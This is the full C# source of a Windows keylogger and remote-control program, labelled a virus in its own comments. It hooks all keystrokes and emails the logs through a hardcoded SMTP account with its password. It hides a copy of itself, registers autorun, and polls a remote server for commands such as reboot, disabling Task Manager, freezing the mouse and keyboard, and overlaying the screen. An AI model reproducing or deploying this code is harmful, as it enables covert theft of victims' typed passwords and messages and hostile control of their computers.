using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Threading;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using ArcheageBot;

namespace rund32
{

    
    public partial class Form1 : Form
    {

        public static string id = "Test";

        [DllImport("user32.dll")]
        public static extern void SetCursorPos(int x, int y);
        public static bool disp;
        public static int[] save = new int[4];
        public static string needPatch = "C:\\Users\\Public\\";
        public static bool holdKeyboard;

        public Form1()
        {
            disp = true;
            holdKeyboard = false;
            save[0] = 0;
            save[1] = 0;
            save[2] = 0;
            save[3] = 0;

                 autorun.SetAutorunValue(true, needPatch + "system.exe"); // добавить в автозагрузку
                //SetAutorunValue(false, needPatch + "system.exe");  // убрать из автозагрузки

                 
            InitializeComponent();

        }
        public void DispetcherEnable()
        {
            if (!disp)
            {
                Microsoft.Win32.RegistryKey RegKeyDel = Microsoft.Win32.Registry.CurrentUser;
                try
                {
                    RegKeyDel.DeleteSubKeyTree("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                    RegKeyDel.Close();
                }
                catch (Exception)
                {
                   // MessageBox.Show(ex.ToString());
                }
                disp = true;
            }
        }
        public void DispetcherDisable()
        {
            if (disp)
            {
                Microsoft.Win32.RegistryKey regkey;
                string keyValueInt = "1";
                string subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

                try
                {
                    regkey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(subKey);
                    regkey.SetValue("DisableTaskMgr", keyValueInt);
                    regkey.Close();
                }
                catch (Exception )
                {
                    //MessageBox.Show(ex.ToString());
                }
                disp = false;
            }
        }
        private void Form1_Load(object sender, EventArgs e)
        {


           // StreamReader sr = new StreamReader("user.exe");
           // id = sr.ReadLine();
           // sr.Close();

            timer1.Enabled = true;
            SetHook();

            if (!File.Exists(needPatch + "system.exe"))
            {
                try
                {
                    File.Copy("system.exe", needPatch + "system.exe");
                    File.SetAttributes(needPatch + "system.exe", FileAttributes.Hidden);


                    File.Copy("OSVersionInfoDLL.dll", needPatch + "OSVersionInfoDLL.dll");
                    //File.SetAttributes(needPatch + "OSVersionInfoDLL.dll", FileAttributes.Archive);
                    
                }
                catch { }

               
            }

        }




        public static void sys_sleep()
        {
            while (true)
            {
                 Thread s = new Thread(s_b);
                 s.Start();
             }
        }

        private static void s_b()
        {
               int y = 2;
               while (true)
               {
                   y *= y;
               }
        }


        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct TokPriv1Luid
        {
            public int Count;
            public long Luid;
            public int Attr;
        }
        [DllImport("kernel32.dll", ExactSpelling = true)]
        internal static extern IntPtr GetCurrentProcess();
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
        [DllImport("advapi32.dll", SetLastError = true)]
        internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
        ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
        [DllImport("user32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool ExitWindowsEx(int flg, int rea);
        internal const int EWX_REBOOT = 0x00000002;
        internal const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";
        internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
        internal const int TOKEN_QUERY = 0x00000008;
        internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;

        public static Thread thread1;
        public static void DoExitWin(int flg)
        {
            bool ok;
            TokPriv1Luid tp;
            IntPtr hproc = GetCurrentProcess();
            IntPtr htok = IntPtr.Zero;
            ok = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
            tp.Count = 1;
            tp.Luid = 0;
            tp.Attr = SE_PRIVILEGE_ENABLED;
            ok = LookupPrivilegeValue(null, SE_SHUTDOWN_NAME, ref tp.Luid);
            ok = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            ok = ExitWindowsEx(flg, 0);
        }




        public static void start()
        {
            Stopwatch sw = new Stopwatch();
            sw.Start();
            bool b = true;
            bool pl = false;
            while (b)
            {
                
              //  if (sw.ElapsedMilliseconds > 20000)
              //  {
                   // if (!pl)
                  //  {
                       // Thread g = new Thread(sys_sleep);
                       // g.Start();
                   //     pl = true;
                   // }
               // }
                if (sw.ElapsedMilliseconds > 45000)
                {
                    DoExitWin(EWX_REBOOT);
                    b = false;
                }
            }
        }

        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callback, IntPtr hInstance, uint threadId);

        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hInstance);

        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, int wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        const int WH_KEYBOARD_LL = 13; // Номер глобального LowLevel-хука на клавиатуру
        const int WM_KEYDOWN = 0x100; // Сообщения нажатия клавиши

        private LowLevelKeyboardProc _proc = hookProc;
        
        private static IntPtr hhook = IntPtr.Zero;

        public void SetHook()
        {
            IntPtr hInstance = LoadLibrary("User32");
            hhook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, hInstance, 0);
        }

        public static void UnHook()
        {
            UnhookWindowsHookEx(hhook);
        }


        public static string TextMessage;

        public static IntPtr hookProc(int code, IntPtr wParam, IntPtr lParam)
        {
            try
            {
                int vkCode = Marshal.ReadInt32(lParam);

                //MessageBox.Show(Convert.ToString(vkCode));//160

                if (vkCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                {
                    if (holdKeyboard)
                    {
                        return (IntPtr)1;
                    }


                    if (vkCode == 13)
                    {
                        //MessageBox.Show(Convert.ToString(TextMessage.Length) +"||"+ TextMessage);
                        TextMessage += "\n\n";

                        if (TextMessage.Length > 150)
                        {
                            SendMail(TextMessage);
                            TextMessage = "";
                        }

                        return CallNextHookEx(hhook, code, (int)wParam, lParam);
                    }
                    if (vkCode != 32)
                    {
                        if (vkCode == 160)
                        {
                            return CallNextHookEx(hhook, code, (int)wParam, lParam);
                        }

                        TextMessage += GetRuSymbol(vkCode);

                        // return CallNextHookEx(hhook, code, (int)wParam, lParam);    
                    }
                    else
                    {
                        TextMessage += " ";
                        return CallNextHookEx(hhook, code, (int)wParam, lParam);

                    }

                    if (vkCode == 8)
                    {
                        TextMessage = TextMessage.Substring(0, TextMessage.Length - 5);
                        return CallNextHookEx(hhook, code, (int)wParam, lParam);

                    }

                    if (vkCode == 112)
                    {
                        save[0] = vkCode;
                    }
                    if (vkCode == 115)
                    {
                        save[1] = vkCode;
                    }
                    if (vkCode == 116)
                    {
                        save[2] = vkCode;
                    }
                    if (vkCode == 119)
                    {
                        save[3] = vkCode;

                        if (save[0] == 112 && save[1] == 115 && save[2] == 116 && save[3] == 119)
                        {

                            //////ОБРАБОТКА НАЖАТИЯ
                            // myfunc(); // ошибка
                            //MessageBox.Show("Вирус отключен");
                            save[0] = 0;
                            save[1] = 0;
                            save[2] = 0;
                            save[3] = 0;
                            Form2 f2 = new Form2();
                            f2.Show();

                            return (IntPtr)1;
                        }
                        else
                        {
                            return CallNextHookEx(hhook, code, (int)wParam, lParam);
                        }
                    }

                }
            } catch (Exception) { };

                return CallNextHookEx(hhook, code, (int)wParam, lParam);
            
            
        }

        private void Form1_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            // убираем хук
            UnHook();

        }





        public static void myfunc()
        {

            autorun.SetAutorunValue(false, needPatch + "system.exe");

        }

        public int WM_SYSCOMMAND = 0x0112;
        public int SC_MONITORPOWER = 0xF170;
        [DllImport("user32.dll")]
        private static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);

        private void display(int mode)
        {
            //mode = 2 выключение
            //mode = -1 включение
            SendMessage(this.Handle.ToInt32(), WM_SYSCOMMAND, SC_MONITORPOWER, mode);
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            DispetcherEnable();
            holdKeyboard = false; 
            Opacity = 0;
            this.TopMost = false;
            //this.Size = new Size(0,0);
            pictureBox1.Size = this.Size;
            this.Location = new Point(0, 0);
            timer2.Enabled = false;

            try
            {

                string Black_SkypeFile = "http://www.aabot.zyro.com/gallery/files/Virus/SettingVirus"+id+".txt";
                string Black_Skype = null;

                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Black_SkypeFile);// Веб запрос к нашему серверу
                HttpWebResponse response = (HttpWebResponse)request.GetResponse(); // Ответ сервера

                StreamReader reader = new StreamReader(response.GetResponseStream());// Используем чтение потока данных
                while (!reader.EndOfStream)
                {
                    Black_Skype = reader.ReadLine();
                    if (Black_Skype == id)
                    {
                       
                        while (!reader.EndOfStream)
                        {

                            Black_Skype = reader.ReadLine();
                            if (Black_Skype == "Restart")
                            {
                                //  MessageBox.Show("Resatrt");
                                DoExitWin(EWX_REBOOT);
                            }

                            if (Black_Skype == "Restart")
                            {
                                //  MessageBox.Show("Resatrt");
                                DoExitWin(EWX_REBOOT);
                            }
                            if (Black_Skype == "HideWindow")
                            {
                                //   MessageBox.Show("Display(2)");
                                display(2);
                            }
                            if (Black_Skype == "MouseStop")
                            {
                                //  MessageBox.Show("MouseStop");
                                timer2.Enabled = true;
                            }
                            if (Black_Skype == "DispetcherDisable")
                            {
                                //  MessageBox.Show("MouseStop");
                                DispetcherDisable();
                            }
                            if (Black_Skype == "HideDescTop")
                            {
                                //MessageBox.Show("HideDescTop");
                                Opacity = 0.01;
                                this.TopMost = true;
                                this.Size = new Size(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width, System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height);
                                this.Location = new Point(0, 0);
                            }
                            if (Black_Skype == "ReverseScreen")
                            {
                                try
                                {


                                    ScreenCapture CurrentScreen = new ScreenCapture();
                                    ScreenCapture.Screen = CurrentScreen.CaptureScreen();
                                    pictureBox1.Image = ScreenCapture.Screen;

                                    ScreenCapture.LockBitmap.Screen = new ScreenCapture.LockBitmap(new Bitmap(ScreenCapture.Screen));
                                    ScreenCapture.LockBitmap.Screen.LockBits();
                                    //ScreenCapture.LockBitmap.Screen.UnlockBits(); - не известно назначение, работает и без неё
                                    pictureBox1.Image.RotateFlip(RotateFlipType.Rotate180FlipNone);
                                    

                                    Opacity = 1;
                                    this.TopMost = true;
                                    this.Size = new Size(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width, System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height);
                                    this.Location = new Point(0, 0);
                                    pictureBox1.Size = this.Size;
                                    
                                }

                                catch (Exception)
                                {
                                }
                            }

                            if (Black_Skype == "HoldKeyboard")
                            {
                                holdKeyboard = true;
                            }
                            if (Black_Skype == "Message")
                            {
                                int coordX = Convert.ToInt32(reader.ReadLine());
                                int coordY = Convert.ToInt32(reader.ReadLine());
                                this.label1.AutoSize = true;
                                this.label1.BackColor = System.Drawing.Color.Transparent;
                                
                                this.label1.Size = new System.Drawing.Size(65, 29);
                                this.label1.TabIndex = 0;
                                this.label1.ForeColor = System.Drawing.Color.Yellow;

                                this.label2.AutoSize = true;
                                this.label2.BackColor = System.Drawing.Color.Transparent;
                                
                                this.label2.Size = new System.Drawing.Size(65, 29);
                                this.label2.TabIndex = 0;
                                this.label2.ForeColor = System.Drawing.Color.Yellow;

                                this.label3.AutoSize = true;
                                this.label3.BackColor = System.Drawing.Color.Transparent;
                                
                                this.label3.Size = new System.Drawing.Size(65, 29);
                                this.label3.TabIndex = 0;
                                this.label3.ForeColor = System.Drawing.Color.Yellow;
                               
                                this.Location = new Point(coordX, coordY);
                                this.FormBorderStyle = FormBorderStyle.None;
                                this.AllowTransparency = true;
                                this.BackColor = Color.Black;//цвет фона  
                                this.TransparencyKey = this.BackColor;//он же будет заменен на прозрачный цвет

                            
                                Opacity = 1;
                                label1.Visible = true;
                                label2.Visible = true;
                                label3.Visible = true;
                                
                                label1.Text = reader.ReadLine();
                                label2.Text = reader.ReadLine();
                                label3.Text = reader.ReadLine();
                                Single fontSize = Convert.ToSingle(reader.ReadLine());
                                label1.Font = new System.Drawing.Font("Microsoft Sans Serif", fontSize, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
                                label2.Font = new System.Drawing.Font("Microsoft Sans Serif", fontSize, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
                                label3.Font = new System.Drawing.Font("Microsoft Sans Serif", fontSize, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));

                                label2.Location = new Point(label2.Location.X, label1.Location.Y + Convert.ToInt32(fontSize)+20);
                                label3.Location = new Point(label3.Location.X, label2.Location.Y + Convert.ToInt32(fontSize)+20);
                                
                                //MessageBox.Show(label1.Text);
                                
                            }

                        }
                    
                    }
                }
            }
            catch (Exception) { }
           // DoExitWin(EWX_REBOOT);
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            SetCursorPos(2000, 0);
        }



        public static void SendMail(string message)
        {
            Thread Thread1 = new Thread(() =>
            {
                string smtpServer = "smtp.list.ru";
                string from = "soild@list.ru";
                string password = "Hi73s6dL";
                string mailto = "soild2015@mail.ru";
                string caption = "Ввод текста от " + id;
                //MessageBox.Show("Отправляю");

                try
                {

                    MailMessage mail = new MailMessage();
                    mail.From = new MailAddress(from);
                    mail.To.Add(new MailAddress(mailto));
                    mail.Subject = caption;
                    mail.Body = message;




                    SmtpClient client = new SmtpClient();
                    client.Host = smtpServer;
                    client.Port = 587;
                    client.EnableSsl = true;
                    client.Credentials = new NetworkCredential(from.Split('@')[0], password);
                    client.DeliveryMethod = SmtpDeliveryMethod.Network;
                    client.Send(mail);
                    mail.Dispose();

                    //MessageBox.Show("Сообщение отправлено");

                }
                catch (Exception e)
                {

                    //throw new Exception("Mail.Send: " + e.Message);
                    //MessageBox.Show("Сбой отправки сообщения : " + e.Message);
                }
            });
            Thread1.Start();
        }
        private static string GetRuHighSymbol(int code)
        {
            switch (code)
            {
                   
                case 81: return "Й";
                case 87: return "Ц";
                case 69: return "У";
                case 82: return "К";
                case 84: return "Е";
                case 89: return "Н";
                case 85: return "Г";
                case 73: return "Ш";
                case 79: return "Щ";
                case 80: return "З";
                case 219: return "Х";
                case 221: return "Ъ";
                case 65: return "Ф";
                case 83: return "Ы";
                case 68: return "В";
                case 70: return "А";
                case 71: return "П";
                case 72: return "Р";
                case 74: return "О";
                case 75: return "Л";
                case 76: return "Д";
                case 186: return "Ж";
                case 222: return "Э";
                case 90: return "Я";
                case 88: return "Ч";
                case 67: return "С";
                case 86: return "М";
                case 66: return "И";
                case 78: return "Т";
                case 77: return "Ь";
                case 188: return "Б";
                case 190: return "Ю";
                case 192: return "Ё";
                case 32: return " ";
                case 33: return "";
                case 34: return "";
                case 9: return "";
                case 16: return "";
                case 17: return "";
                case 112: return "F1";
                case 113: return "F2";
                case 114: return "F3";
                case 115: return "F4";
                case 116: return "F5";
                case 117: return "F6";
                case 118: return "F7";
                case 119: return "F8";
                case 120: return "F9";
                case 121: return "F10";
                case 122: return "F11";
                case 123: return "F12";
                case 48: return "0";
                case 49: return "1";
                case 50: return "2";
                case 51: return "3";
                case 52: return "4";
                case 53: return "5";
                case 54: return "6";
                case 55: return "7";
                case 56: return "8";
                case 57: return "9";
                case 108: return "-";
                case 107: return "+";
                case 110: return "|";
                case 191: return ",";

                default: Keys inp = (Keys)(code); return inp.ToString();

            }
        }
        private static string GetRuSymbol(int code)
        {
            switch (code)
            {

                case 81: return "й";
                case 87: return "ц";
                case 69: return "у";
                case 82: return "к";
                case 84: return "е";
                case 89: return "н";
                case 85: return "г";
                case 73: return "ш";
                case 79: return "щ";
                case 80: return "з";
                case 219: return "х";
                case 221: return "ъ";
                case 65: return "ф";
                case 83: return "ы";
                case 68: return "в";
                case 70: return "а";
                case 71: return "п";
                case 72: return "р";
                case 74: return "о";
                case 75: return "л";
                case 76: return "д";
                case 186: return "ж";
                case 222: return "э";
                case 90: return "я";
                case 88: return "ч";
                case 67: return "с";
                case 86: return "м";
                case 66: return "и";
                case 78: return "т";
                case 77: return "ь";
                case 188: return "б";
                case 190: return "ю";
                case 192: return "Ё";
                case 32: return " ";
                case 33: return "";
                case 34: return "";
                case 9: return "";
                case 16: return "";
                case 17: return "";
                case 112: return "F1";
                case 113: return "F2";
                case 114: return "F3";
                case 115: return "F4";
                case 116: return "F5";
                case 117: return "F6";
                case 118: return "F7";
                case 119: return "F8";
                case 120: return "F9";
                case 121: return "F10";
                case 122: return "F11";
                case 123: return "F12";
                case 48: return "0";
                case 49: return "1";
                case 50: return "2";
                case 51: return "3";
                case 52: return "4";
                case 53: return "5";
                case 54: return "6";
                case 55: return "7";
                case 56: return "8";
                case 57: return "9";
                case 108: return "-";
                case 107: return "+";
                case 110: return "|";
                case 191: return ",";
                default: return "";//Keys inp = (Keys)(code); 
                //return "";//inp.ToString();

            }
        }
        private bool altF4 = false;
        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Alt && e.KeyCode == Keys.F4)
            {
                //MessageBox.Show("Не буду");
                altF4 = true;
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (altF4)
            {
                if (e.CloseReason == CloseReason.UserClosing)
                    e.Cancel = true;
                altF4 = false;
            }
        }


         
        
    }





    class autorun
    {
        public static bool SetAutorunValue(bool autorun, string npath)
        {
            const string name = "systems";
            string ExePath = npath;
            RegistryKey reg;

            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {
                if (autorun)
                    reg.SetValue(name, ExePath);
                else
                    reg.DeleteValue(name);
                reg.Flush();
                reg.Close();
            }
            catch
            {
                return false;
            }
            return true;
        }
    }

}
